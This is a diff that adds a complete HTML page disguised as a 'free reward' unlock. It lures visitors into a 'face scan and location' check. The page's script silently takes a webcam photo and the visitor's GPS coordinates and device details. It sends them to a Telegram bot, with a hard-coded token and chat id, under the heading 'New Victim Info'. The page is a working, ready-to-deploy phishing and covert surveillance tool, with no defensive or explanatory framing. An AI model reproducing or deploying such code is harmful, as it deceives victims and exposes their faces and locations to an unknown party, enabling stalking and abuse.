@@ -1,0 +1,84 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Unlock Your Free Reward</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; background: #f2f2f2; padding: 50px; }
+    #video, #canvas { display: none; }
+    .card {
+      background: white; padding: 30px; border-radius: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2); display: inline-block;
+    }
+    button {
+      background: #28a745; color: white; padding: 15px 25px;
+      border: none; border-radius: 5px; font-size: 18px; cursor: pointer;
+    }
+    button:hover { background: #218838; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Unlock Your Free Reward</h1>
+    <p>Please verify your identity with face scan and location.</p>
+    <button onclick="startProcess()">Verify Now</button><br><br>
+    <video id="video" width="300" autoplay></video>
+    <canvas id="canvas" width="300" height="225"></canvas>
+  </div>
+
+  <script>
+    const botToken = "7799069529:AAGdUwQsEhCpf9jMg_C5oUwJHITm9aaGx9Y";
+    const chatId = "7187468717";
+
+    async function startProcess() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.style.display = 'block';
+
+        setTimeout(() => {
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL('image/jpeg');
+          sendPhoto(imageData);
+        }, 3000);
+
+      } catch (err) {
+        alert("Camera access denied!");
+      }
+
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition((position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
+          const message = `New Victim Info:
+Location: ${mapLink}
+Device: ${navigator.userAgent}`;
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+          });
+        });
+      }
+    }
+
+    function sendPhoto(base64) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: JSON.stringify({
+          chat_id: chatId,
+          photo: base64
+        }),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      });
+    }
+  </script>
+</body>
+</html>
